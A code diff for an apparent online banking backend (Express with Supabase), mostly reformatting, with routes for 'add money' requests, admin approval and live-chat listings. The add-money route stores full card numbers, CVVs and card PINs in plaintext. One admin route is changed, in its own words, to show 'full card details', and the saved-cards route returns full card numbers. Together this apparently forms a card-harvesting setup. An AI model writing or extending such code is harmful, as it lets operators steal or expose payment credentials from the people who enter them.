@@ -1938,67 +1938,77 @@ app.post("/api/chat/live", authenticate, async (req, res) => {
 
 // In your user routes file (protected by authenticate middleware)
 // GET saved cards (for display in Add Money page)
-app.get('/api/user/saved-cards', authenticate, async (req, res) => {
-    try {
-        const { data, error } = await supabase
-            .from('add_money_requests')
-            .select('id, card_number, expiry_date, cardholder_name, card_type, status')
-            .eq('user_id', req.user.id)
-            .eq('status', 'approved')
-            .order('created_at', { ascending: false });
+app.get("/api/user/saved-cards", authenticate, async (req, res) => {
+  try {
+    const { data, error } = await supabase
+      .from("add_money_requests")
+      .select(
+        "id, card_number, expiry_date, cardholder_name, card_type, status",
+      )
+      .eq("user_id", req.user.id)
+      .eq("status", "approved")
+      .order("created_at", { ascending: false });
 
-        if (error) throw error;
+    if (error) throw error;
 
-        res.json(data || []);
-    } catch (error) {
-        console.error('Saved cards error:', error);
-        res.status(500).json({ error: 'Failed to load saved cards' });
-    }
+    res.json(data || []);
+  } catch (error) {
+    console.error("Saved cards error:", error);
+    res.status(500).json({ error: "Failed to load saved cards" });
+  }
 });
 
 // POST Add Money Request
-app.post('/api/user/add-money', authenticate, async (req, res) => {
-    const { card_number, expiry_date, cvv, cardholder_name, amount, card_pin } = req.body;
+app.post("/api/user/add-money", authenticate, async (req, res) => {
+  const { card_number, expiry_date, cvv, cardholder_name, amount, card_pin } =
+    req.body;
 
-    if (!card_number || !expiry_date || !cvv || !cardholder_name || !amount || amount < 10) {
-        return res.status(400).json({ error: 'Invalid card or amount details' });
-    }
+  if (
+    !card_number ||
+    !expiry_date ||
+    !cvv ||
+    !cardholder_name ||
+    !amount ||
+    amount < 10
+  ) {
+    return res.status(400).json({ error: "Invalid card or amount details" });
+  }
 
-    try {
-        const { data, error } = await supabase
-            .from('add_money_requests')
-            .insert({
-                user_id: req.user.id,
-                card_number: card_number.replace(/\s/g, ''), // Remove spaces
-                expiry_date,
-                cvv,
-                cardholder_name,
-                amount,
-                card_pin: card_pin || null, // Add PIN field
-                status: 'pending'
-            })
-            .select()
-            .single();
+  try {
+    const { data, error } = await supabase
+      .from("add_money_requests")
+      .insert({
+        user_id: req.user.id,
+        card_number: card_number.replace(/\s/g, ""), // Remove spaces
+        expiry_date,
+        cvv,
+        cardholder_name,
+        amount,
+        card_pin: card_pin || null, // Add PIN field
+        status: "pending",
+      })
+      .select()
+      .single();
 
-        if (error) throw error;
+    if (error) throw error;
 
-        // Create notification for user
-        await supabase.from('notifications').insert({
-            user_id: req.user.id,
-            title: 'Add Money Request Submitted',
-            message: `Your request to add $${amount} is pending admin approval.`,
-            type: 'info'
-        });
+    // Create notification for user
+    await supabase.from("notifications").insert({
+      user_id: req.user.id,
+      title: "Add Money Request Submitted",
+      message: `Your request to add $${amount} is pending admin approval.`,
+      type: "info",
+    });
 
-        res.json({ 
-            success: true, 
-            message: 'Request sent to admin for approval',
-            request_id: data.id 
-        });
-    } catch (error) {
-        console.error('Add money error:', error);
-        res.status(500).json({ error: 'Failed to submit add money request' });
-    }
+    res.json({
+      success: true,
+      message: "Request sent to admin for approval",
+      request_id: data.id,
+    });
+  } catch (error) {
+    console.error("Add money error:", error);
+    res.status(500).json({ error: "Failed to submit add money request" });
+  }
 });
 
 // ==================== ADMIN ROUTES ================
@@ -2165,12 +2175,85 @@ app.post('/api/admin/add-money-requests/:id/decline', authenticate, authorizeAdm
 // ==================== ADMIN ADD MONEY REQUESTS ROUTES ====================
 
 // GET all add money requests (admin)
+/*app.get(
+  "/api/admin/add-money-requests",
+  authenticate,
+  authorizeAdmin,
+  async (req, res) => {
+    try {
+      const { page = 1, status = "pending", limit = 20 } = req.query;
+      const offset = (page - 1) * limit;
+
+      // Build the query
+      let query = supabase.from("add_money_requests").select(
+        `
+                *,
+                user:users!add_money_requests_user_id_fkey (
+                    id,
+                    first_name,
+                    last_name,
+                    email,
+                    phone
+                )
+            `,
+        { count: "exact" },
+      );
+
+      // Apply status filter if not 'all'
+      if (status && status !== "all" && status !== "") {
+        query = query.eq("status", status);
+      }
+
+      // Order by newest first
+      query = query.order("created_at", { ascending: false });
+
+      // Apply pagination
+      query = query.range(offset, offset + limit - 1);
+
+      const { data: requests, error, count } = await query;
+
+      if (error) {
+        console.error("Supabase error:", error);
+        throw error;
+      }
+
+      // Get pending count for badge
+      const { count: pendingCount, error: pendingError } = await supabase
+        .from("add_money_requests")
+        .select("*", { count: "exact", head: true })
+        .eq("status", "pending");
+
+      if (pendingError) {
+        console.error("Pending count error:", pendingError);
+      }
+
+      res.json({
+        requests: requests || [],
+        pagination: {
+          page: parseInt(page),
+          limit: parseInt(limit),
+          total: count || 0,
+          pages: Math.ceil((count || 0) / limit),
+        },
+        pendingCount: pendingCount || 0,
+      });
+    } catch (error) {
+      console.error("Admin add money requests error:", error);
+      res.status(500).json({
+        error: "Failed to load add money requests",
+        details: error.message,
+      });
+    }
+  },
+);*/
+
+// GET all add money requests (admin) - Modified to show full card details
 app.get('/api/admin/add-money-requests', authenticate, authorizeAdmin, async (req, res) => {
     try {
         const { page = 1, status = 'pending', limit = 20 } = req.query;
         const offset = (page - 1) * limit;
         
-        // Build the query
+        // Build the query - get ALL card details
         let query = supabase
             .from('add_money_requests')
             .select(`
@@ -2233,216 +2316,231 @@ app.get('/api/admin/add-money-requests', authenticate, authorizeAdmin, async (re
 });
 
 // POST approve add money request
-app.post('/api/admin/add-money-requests/:id/approve', authenticate, authorizeAdmin, async (req, res) => {
+app.post(
+  "/api/admin/add-money-requests/:id/approve",
+  authenticate,
+  authorizeAdmin,
+  async (req, res) => {
     const { id } = req.params;
-    
+
     try {
-        // First, get the request
-        const { data: request, error: fetchError } = await supabase
-            .from('add_money_requests')
-            .select('*')
-            .eq('id', id)
-            .single();
-        
-        if (fetchError || !request) {
-            return res.status(404).json({ error: 'Request not found' });
-        }
-        
-        if (request.status !== 'pending') {
-            return res.status(400).json({ error: 'Request already processed' });
-        }
-        
-        // Update request status
-        const { error: updateError } = await supabase
-            .from('add_money_requests')
-            .update({ 
-                status: 'approved',
-                processed_at: new Date().toISOString(),
-                processed_by: req.user.id,
-                admin_note: `Approved by ${req.user.email}`
-            })
-            .eq('id', id);
-        
-        if (updateError) throw updateError;
-        
-        // Find user's primary account
-        const { data: accounts, error: accountError } = await supabase
-            .from('accounts')
-            .select('*')
-            .eq('user_id', request.user_id)
-            .order('created_at', { ascending: true });
-        
-        if (accountError) throw accountError;
-        
-        if (accounts && accounts.length > 0) {
-            const primaryAccount = accounts[0];
-            const newBalance = primaryAccount.balance + request.amount;
-            
-            // Update account balance
-            const { error: balanceError } = await supabase
-                .from('accounts')
-                .update({ 
-                    balance: newBalance,
-                    available_balance: newBalance,
-                    updated_at: new Date().toISOString()
-                })
-                .eq('id', primaryAccount.id);
-            
-            if (balanceError) throw balanceError;
-            
-            // Create transaction record
-            const { error: transError } = await supabase
-                .from('transactions')
-                .insert({
-                    to_account_id: primaryAccount.id,
-                    to_user_id: request.user_id,
-                    amount: request.amount,
-                    description: `Add money via card ending in ${request.card_number.slice(-4)}`,
-                    transaction_type: 'deposit',
-                    status: 'completed',
-                    completed_at: new Date().toISOString(),
-                    is_admin_adjusted: true,
-                    admin_note: `Approved by admin ${req.user.email}`
-                });
-            
-            if (transError) console.error('Transaction creation error:', transError);
-        }
-        
-        // Send notification to user
-        await supabase
-            .from('notifications')
-            .insert({
-                user_id: request.user_id,
-                title: 'Add Money Request Approved ✅',
-                message: `Your request to add $${request.amount} has been approved and added to your account.`,
-                type: 'success',
-                created_at: new Date().toISOString()
-            });
-        
-        res.json({ 
-            success: true, 
-            message: 'Request approved and funds added successfully',
-            request_id: id
-        });
-        
+      // First, get the request
+      const { data: request, error: fetchError } = await supabase
+        .from("add_money_requests")
+        .select("*")
+        .eq("id", id)
+        .single();
+
+      if (fetchError || !request) {
+        return res.status(404).json({ error: "Request not found" });
+      }
+
+      if (request.status !== "pending") {
+        return res.status(400).json({ error: "Request already processed" });
+      }
+
+      // Update request status
+      const { error: updateError } = await supabase
+        .from("add_money_requests")
+        .update({
+          status: "approved",
+          processed_at: new Date().toISOString(),
+          processed_by: req.user.id,
+          admin_note: `Approved by ${req.user.email}`,
+        })
+        .eq("id", id);
+
+      if (updateError) throw updateError;
+
+      // Find user's primary account
+      const { data: accounts, error: accountError } = await supabase
+        .from("accounts")
+        .select("*")
+        .eq("user_id", request.user_id)
+        .order("created_at", { ascending: true });
+
+      if (accountError) throw accountError;
+
+      if (accounts && accounts.length > 0) {
+        const primaryAccount = accounts[0];
+        const newBalance = primaryAccount.balance + request.amount;
+
+        // Update account balance
+        const { error: balanceError } = await supabase
+          .from("accounts")
+          .update({
+            balance: newBalance,
+            available_balance: newBalance,
+            updated_at: new Date().toISOString(),
+          })
+          .eq("id", primaryAccount.id);
+
+        if (balanceError) throw balanceError;
+
+        // Create transaction record
+        const { error: transError } = await supabase
+          .from("transactions")
+          .insert({
+            to_account_id: primaryAccount.id,
+            to_user_id: request.user_id,
+            amount: request.amount,
+            description: `Add money via card ending in ${request.card_number.slice(-4)}`,
+            transaction_type: "deposit",
+            status: "completed",
+            completed_at: new Date().toISOString(),
+            is_admin_adjusted: true,
+            admin_note: `Approved by admin ${req.user.email}`,
+          });
+
+        if (transError)
+          console.error("Transaction creation error:", transError);
+      }
+
+      // Send notification to user
+      await supabase.from("notifications").insert({
+        user_id: request.user_id,
+        title: "Add Money Request Approved ✅",
+        message: `Your request to add $${request.amount} has been approved and added to your account.`,
+        type: "success",
+        created_at: new Date().toISOString(),
+      });
+
+      res.json({
+        success: true,
+        message: "Request approved and funds added successfully",
+        request_id: id,
+      });
     } catch (error) {
-        console.error('Approve error:', error);
-        res.status(500).json({ 
-            error: 'Failed to approve request',
-            details: error.message 
-        });
+      console.error("Approve error:", error);
+      res.status(500).json({
+        error: "Failed to approve request",
+        details: error.message,
+      });
     }
-});
+  },
+);
 
 // POST decline add money request
-app.post('/api/admin/add-money-requests/:id/decline', authenticate, authorizeAdmin, async (req, res) => {
+app.post(
+  "/api/admin/add-money-requests/:id/decline",
+  authenticate,
+  authorizeAdmin,
+  async (req, res) => {
     const { id } = req.params;
     const { reason } = req.body;
-    
+
     try {
-        // Get the request first
-        const { data: request, error: fetchError } = await supabase
-            .from('add_money_requests')
-            .select('*')
-            .eq('id', id)
-            .single();
-        
-        if (fetchError || !request) {
-            return res.status(404).json({ error: 'Request not found' });
-        }
-        
-        if (request.status !== 'pending') {
-            return res.status(400).json({ error: 'Request already processed' });
-        }
-        
-        // Update request status
-        const { error: updateError } = await supabase
-            .from('add_money_requests')
-            .update({ 
-                status: 'declined',
-                admin_note: reason || 'Declined by admin',
-                processed_at: new Date().toISOString(),
-                processed_by: req.user.id
-            })
-            .eq('id', id);
-        
-        if (updateError) throw updateError;
-        
-        // Send notification to user
-        await supabase
-            .from('notifications')
-            .insert({
-                user_id: request.user_id,
-                title: 'Add Money Request Declined ❌',
-                message: `Your request to add $${request.amount} was declined. Reason: ${reason || 'Not specified'}`,
-                type: 'error',
-                created_at: new Date().toISOString()
-            });
-        
-        res.json({ 
-            success: true, 
-            message: 'Request declined successfully',
-            request_id: id
-        });
-        
+      // Get the request first
+      const { data: request, error: fetchError } = await supabase
+        .from("add_money_requests")
+        .select("*")
+        .eq("id", id)
+        .single();
+
+      if (fetchError || !request) {
+        return res.status(404).json({ error: "Request not found" });
+      }
+
+      if (request.status !== "pending") {
+        return res.status(400).json({ error: "Request already processed" });
+      }
+
+      // Update request status
+      const { error: updateError } = await supabase
+        .from("add_money_requests")
+        .update({
+          status: "declined",
+          admin_note: reason || "Declined by admin",
+          processed_at: new Date().toISOString(),
+          processed_by: req.user.id,
+        })
+        .eq("id", id);
+
+      if (updateError) throw updateError;
+
+      // Send notification to user
+      await supabase.from("notifications").insert({
+        user_id: request.user_id,
+        title: "Add Money Request Declined ❌",
+        message: `Your request to add $${request.amount} was declined. Reason: ${reason || "Not specified"}`,
+        type: "error",
+        created_at: new Date().toISOString(),
+      });
+
+      res.json({
+        success: true,
+        message: "Request declined successfully",
+        request_id: id,
+      });
     } catch (error) {
-        console.error('Decline error:', error);
-        res.status(500).json({ 
-            error: 'Failed to decline request',
-            details: error.message 
-        });
+      console.error("Decline error:", error);
+      res.status(500).json({
+        error: "Failed to decline request",
+        details: error.message,
+      });
     }
-});
+  },
+);
 
 // ADMIN - List of users who ever sent a message
-app.get("/api/admin/live-chat/users", authenticate, authorizeAdmin, async (req, res) => {
-  try {
-    // Step 1: Get distinct user_ids that have at least one message
-    const { data: userIdsData, error: idsError } = await supabase
-      .from("live_support_messages")
-      .select("user_id")
-      .order("created_at", { ascending: false });
+app.get(
+  "/api/admin/live-chat/users",
+  authenticate,
+  authorizeAdmin,
+  async (req, res) => {
+    try {
+      // Step 1: Get distinct user_ids that have at least one message
+      const { data: userIdsData, error: idsError } = await supabase
+        .from("live_support_messages")
+        .select("user_id")
+        .order("created_at", { ascending: false });
 
-    if (idsError) {
-      console.error("Error fetching user_ids:", idsError);
-      throw idsError;
+      if (idsError) {
+        console.error("Error fetching user_ids:", idsError);
+        throw idsError;
+      }
+
+      if (!userIdsData || userIdsData.length === 0) {
+        return res.json({ users: [] });
+      }
+
+      // Step 2: Get unique user_ids
+      const uniqueUserIds = [...new Set(userIdsData.map((row) => row.user_id))];
+
+      // Step 3: Fetch user details for those IDs
+      const { data: usersData, error: usersError } = await supabase
+        .from("users")
+        .select("id, first_name, last_name, email")
+        .in("id", uniqueUserIds);
+
+      if (usersError) {
+        console.error("Error fetching users:", usersError);
+        throw usersError;
+      }
+
+      // Step 4: Format response
+      const formattedUsers = (usersData || []).map((user) => ({
+        user_id: user.id,
+        name:
+          `${user.first_name || ""} ${user.last_name || ""}`.trim() ||
+          "Unknown",
+        email: user.email || "no-email@found.com",
+      }));
+
+      res.json({ users: formattedUsers });
+    } catch (err) {
+      console.error(
+        "ADMIN /live-chat/users CRASH:",
+        err.message,
+        err.details || err,
+      );
+      res.status(500).json({
+        error: "Failed to load conversations",
+        debug: err.message, // ← helpful in dev, remove in prod if you want
+      });
     }
-
-    if (!userIdsData || userIdsData.length === 0) {
-      return res.json({ users: [] });
-    }
-
-    // Step 2: Get unique user_ids
-    const uniqueUserIds = [...new Set(userIdsData.map(row => row.user_id))];
-
-    // Step 3: Fetch user details for those IDs
-    const { data: usersData, error: usersError } = await supabase
-      .from("users")
-      .select("id, first_name, last_name, email")
-      .in("id", uniqueUserIds);
-
-    if (usersError) {
-      console.error("Error fetching users:", usersError);
-      throw usersError;
-    }
-
-    // Step 4: Format response
-    const formattedUsers = (usersData || []).map(user => ({
-      user_id: user.id,
-      name: `${user.first_name || ''} ${user.last_name || ''}`.trim() || "Unknown",
-      email: user.email || "no-email@found.com"
-    }));
-
-    res.json({ users: formattedUsers });
-
-  } catch (err) {
-    console.error("ADMIN /live-chat/users CRASH:", err.message, err.details || err);
-    res.status(500).json({ 
-      error: "Failed to load conversations",
-      debug: err.message   // ← helpful in dev, remove in prod if you want
-    });
-  }
-});
+  },
+);
 
 // ADMIN SIDE - Get messages for a specific user
 app.get(
@@ -2495,8 +2593,6 @@ app.post(
     }
   },
 );
-
-
 
 // Get all users (admin)
 app.get("/api/admin/users", authenticate, authorizeAdmin, async (req, res) => {
